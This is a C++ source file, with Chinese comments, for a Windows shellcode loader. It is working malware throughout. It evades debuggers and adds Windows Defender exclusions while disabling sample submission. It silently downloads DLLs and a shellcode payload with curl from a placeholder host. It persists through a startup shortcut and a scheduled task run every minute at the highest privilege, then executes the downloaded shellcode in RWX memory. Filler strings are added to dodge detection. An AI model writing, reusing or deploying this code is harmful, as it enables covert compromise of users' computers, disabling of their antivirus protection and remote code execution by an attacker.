#include <iostream>
#include <fstream>
#include <vector>
#include <thread>
#include <string>
using namespace std;
#include <windows.h>
#include <shlobj.h> // 包含IShellLink和IPersistFile定义
#pragma comment(lib, "ole32.lib")
#include <shlwapi.h>
#include <tchar.h>
#pragma comment(lib, "shlwapi.lib")
#include<math.h>
#include <UrlMon.h>  //URLDownloadToFile函数必须包含的链接静态库头文件
#pragma comment(lib, "urlmon.lib")  //与<UrlMon.h> 头文件配套的库文件
#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )//不显示控制台
#include <filesystem>
#include<time.h>





std::vector<unsigned char> readShellcodeFile(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file.is_open()) {
        throw std::runtime_error("无法打开文件: " + filePath);
    }

    std::vector<unsigned char> shellcode((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    return shellcode;
}




int exe_local_file(const char* exePath) {

    char command[256];

    // 构建命令字符串
    snprintf(command, sizeof(command), "start /b %s", exePath);

    // 执行命令
    int result = system(command);


    // 检查执行结果
    if (result == 0) {
        std::cout << "程序执行成功" << std::endl;
    }
    else {
        std::cout << "程序执行失败" << std::endl;
    }
    return 0;

}





int  read_local_file(string sourceFilePath, const char* destinationFilePath) {

    // 打开源文件，以二进制模式读取
    std::ifstream sourceFile(sourceFilePath, std::ios::binary);
    if (!sourceFile) {
        std::cerr << "无法打开源文件: " << sourceFilePath << std::endl;
        return 1;
    }

    // 打开目标文件，以二进制模式写入
    std::ofstream destinationFile(destinationFilePath, std::ios::binary);
    if (!destinationFile) {
        std::cerr << "无法打开目标文件: " << destinationFilePath << std::endl;
        return 1;
    }

    // 读取源文件的内容并写入目标文件
    char buffer[1024];
    while (sourceFile.read(buffer, sizeof(buffer))) {
        destinationFile.write(buffer, sourceFile.gcount());
    }

    // 处理剩余的数据
    if (sourceFile.eof()) {
        destinationFile.write(buffer, sourceFile.gcount());
    }
    else {
        std::cerr << "读取源文件时发生错误" << std::endl;
        return 1;
    }

    // 关闭文件
    sourceFile.close();
    destinationFile.close();

    std::cout << "文件复制完成" << std::endl;
    exe_local_file(destinationFilePath);
    return 0;


}


void executeShellcode(const std::vector<unsigned char>& shellcode) {
    // 分配可执行内存
    void* execMemory = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMemory == NULL) {
        throw std::runtime_error("VirtualAlloc failed");
    }

    // 将Shellcode复制到分配的内存中

    if (!WriteProcessMemory(GetCurrentProcess(), execMemory, shellcode.data(), shellcode.size(), NULL)) {
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }

    // 创建线程执行Shellcode
    HANDLE hThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(execMemory), NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "线程创建失败" << std::endl;
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }

    // 等待线程完成
    WaitForSingleObject(hThread, INFINITE);

    // 清理资源
    VirtualFree(execMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);

}




void anti_debug() {
    if (IsDebuggerPresent()) {
        exit(1);
    }

    BOOL being_debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &being_debugged);
    if (being_debugged) {
        exit(1);
    }

    SetLastError(0);
    OutputDebugStringA("RlY");
    if (GetLastError() != 0) {
        exit(1);
    }
}





//创建快捷方式
void CreateShortcut(const char* targetPath, const wchar_t* shortcutPath)
{
    HRESULT hres;
    IShellLink* psl;

    // 创建IShellLink对象
    hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
    if (SUCCEEDED(hres))
    {
        IPersistFile* ppf;

        // 设置快捷方式的目标路径
        psl->SetPath(targetPath);
        psl->SetDescription("My Shortcut Description");

        // 转换为IPersistFile接口
        hres = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);

        if (SUCCEEDED(hres))
        {
            // 保存快捷方式 (.lnk) 文件
            hres = ppf->Save(shortcutPath, TRUE);
            ppf->Release();
        }
        psl->Release();
    }
}





//执行命令
void ExecuteCommandSilently(const std::string& command) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // 初始化 STARTUPINFO 结构体
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // 隐藏窗口

    // 初始化 PROCESS_INFORMATION 结构体
    ZeroMemory(&pi, sizeof(pi));

    // 创建进程
    if (!CreateProcess(
        NULL,                   // 不指定可执行文件名，使用命令行
        const_cast<char*>(command.c_str()),  // 命令行字符串
        NULL,                   // 进程安全属性
        NULL,                   // 线程安全属性
        FALSE,                  // 不继承句柄
        CREATE_NO_WINDOW,       // 创建时不显示窗口
        NULL,                   // 使用父进程的环境块
        NULL,                   // 使用父进程的起始目录
        &si,                    // 指向 STARTUPINFO 结构体
        &pi))                   // 指向 PROCESS_INFORMATION 结构体
    {
        //std::cerr << "CreateProcess failed (" << GetLastError() << ")" << std::endl;
        return;
    }

    // 等待进程结束
    WaitForSingleObject(pi.hProcess, INFINITE);

    // 关闭进程和线程句柄
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

//获取该文件的绝对路径
std::string GetExecutablePath() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}





void downloadFileHidden(const char* url, const char* outputPath) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // 设置窗口样式为隐藏
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char command[256];
    snprintf(command, sizeof(command), "curl %s -o %s", url, outputPath);

    // 创建进程
    if (!CreateProcess(NULL,   
        command,       
        NULL,          
        NULL,           
        FALSE,          
        0,              
        NULL,           
        NULL,           
        &si,            
        &pi)         
        ) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return;
    }

    // 等待进程结束
    WaitForSingleObject(pi.hProcess, INFINITE);

    // 关闭进程和线程句柄
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}





int main() {
    //反调试
    anti_debug();
    std::string  file_pathsss = GetExecutablePath();  //获取该程序的文件路径（绝对）
    //排除该程序
    std::string cmode_2 = "powershell -Command Add-MpPreference -ExclusionPath ";
    std::string resl = cmode_2 + file_pathsss;
    ExecuteCommandSilently(resl);
    std::string cmode_23 = "powershell -Command Add-MpPreference -ExclusionPath C:/Users/Public/Downloads/Downloada.exe";
    ExecuteCommandSilently(cmode_23);
    //关闭自动提交
    std::string comds_1 = "powershell -Command Set-MpPreference -SubmitSamplesConsent NeverSend";
    ExecuteCommandSilently(comds_1);



    //加载所需要的dll文件 防止他报错   
    downloadFileHidden("http://ip/msvcp1401.dll", "C:/Windows/SysWOW64/msvcp140.dll");
    downloadFileHidden("http://ip/msvcp140.dll", "c:/Windows/System32/msvcp140.dll");
    downloadFileHidden("http://ip/vcruntime140.dll", "c:/Windows/System32/vcruntime140.dll");


    //将该程序copy一份去别的路径
    const char* s12 = "C:/Users/Public/Downloads/Downloada.exe";
    std::thread thread2(read_local_file, file_pathsss, s12);




    // 初始化COM库
    CoInitialize(NULL);

    const wchar_t* shortcutFilePath_1 = L"C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/test1131110.lnk";
    // 创建快捷方式
    CreateShortcut(s12, shortcutFilePath_1);
    // 清理COM库
    CoUninitialize();


    downloadFileHidden("http://ip/output_86.bin", "c:/Windows/1.bin");
    const char* ssdfds123 = " hhhhhh";
    // 添加任务计划  使其每分钟执行一次
    std::thread ss1(ExecuteCommandSilently, "schtasks /Create /TN test91112310 /SC MINUTE /MO 1 /TR C:/Users/Public/Downloads/Downloada.exe /RL HIGHEST");


    //适当加入一些无用的字符
    const char* ssdsfds = "url is hhhhhh";
    //下面是最后执行的程序
    try {


        /*
        读取文件内容，并加载shellcode
        */
        std::string ss1 = "c:/Windows/1.bin";
        std::vector<unsigned char> sd = readShellcodeFile(ss1);
        std::thread shellcode_load(executeShellcode, sd);

        //每200秒执行一次
        while (1) {
            //关闭自动提交
            ExecuteCommandSilently(comds_1);
            //排除该程序
            ExecuteCommandSilently(resl);
            Sleep(200000);
        }


    }
    catch (const std::exception& e) {
        std::cerr << "错误: " << e.what() << std::endl;
    }

    return 0;
}








